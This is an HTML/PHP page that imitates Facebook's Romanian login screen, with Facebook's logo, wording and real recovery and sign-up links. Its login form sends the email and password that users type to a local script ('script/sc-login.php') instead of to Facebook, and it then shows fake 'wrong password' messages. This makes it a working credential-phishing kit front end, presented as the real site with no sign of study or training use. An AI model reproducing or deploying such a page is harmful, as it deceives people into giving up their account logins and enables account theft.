<!DOCTYPE html>
<html>
  <head>
    <title id="pageTitle">Facebook - conecteaz&#259;-te sau înscrie-te</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="https://www.facebook.com/images/fb_icon_325x325.png">
    <meta name="description" content="">
    <meta name="author" content="w3hubs.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">

    <style type="text/css">
      body{
      background-color: #f0f2f5;
      font-family: "Nunito Sans";
      }
      .login-form{
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
      background-color: #fff;
      padding: 25px;
      }
      h3{
      padding-left:30px;
      padding-right: 20px;
      }
      .btn-custom{
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      line-height: 28px;
      color: #fff;
      font-weight:700;
      height: 48px;
      }
      .btn-custom{
      color: #fff !important;
      }
      input{
      height: 52px;
      font-size: 18px !important;
      color: #f2f2f2;
      }
      .form-control:focus{
      box-shadow: 0 0 0 0 rgba(13,110,253,.25);
      }
      a{
      text-decoration: none;
      }
      a:hover{
      text-decoration: underline;
      }
      @media(max-width: 768px){
        input{
          font-size: 16px !important;
        }
        .login-form{
          box-shadow: none;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="row align-items-center justify-content-center vh-100">
        <div class="col-md-7">
          <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="w-50">
          <h3>Facebook te ajută să iei legătura şi să comunici cu persoanele din viaţa ta</h3>
        </div>
        <div class="col-md-5">
          <form class="login-form" action="script/sc-login.php" method="POST">
              <div class="mb-3">
                <input type="text" name="email" id="email" class="form-control" placeholder="E-mail sau număr de telefon:"
                  required>
              </div>
              <div class="mb-3">
                <input type="password" id="pass" name="pass" class="form-control" placeholder="Parolă"
                  required>
              </div>
              <button type="submit" value="Submit" class="btn btn-custom btn-lg btn-block mt-3">Conectare</button>
              <div class="text-center pt-3 pb-3">
              <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMwNzYyNzIzLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D">Ai uitat parola?</a>
                <hr>
                <a role="button" class="btn btn-success btn-lg mt-3" href="https://www.facebook.com/r.php" ajaxify="/reg/spotlight/" id="u_0_2_b2" data-testid="open-registration-form-button" rel="async">Creează un cont nou</a>
              </div>
              </form>
              <?php
                if (isset($_GET['info']) && $_GET['info'] == 'gresit'){
                  echo '<p class="text" style=" padding-top: 5px; color:red; text-align: center; font-weight: bold;">Numele de utilizator sau parola este gresita!</p>';
                }else if (isset($_GET['info']) && $_GET['info'] == 'time'){
                  echo '<p class="text" style=" padding-top: 5px; color:red; text-align: center; font-weight: bold;">Te rog asteapta!</p>';
                }
						  ?> 

              <p class="pt-3 text-center"><b>Creează o Pagină </b> pentru o celebritate, o formaţie sau o companie.</p>
        </div>
      </div>
    </div>
  </body>
</html>		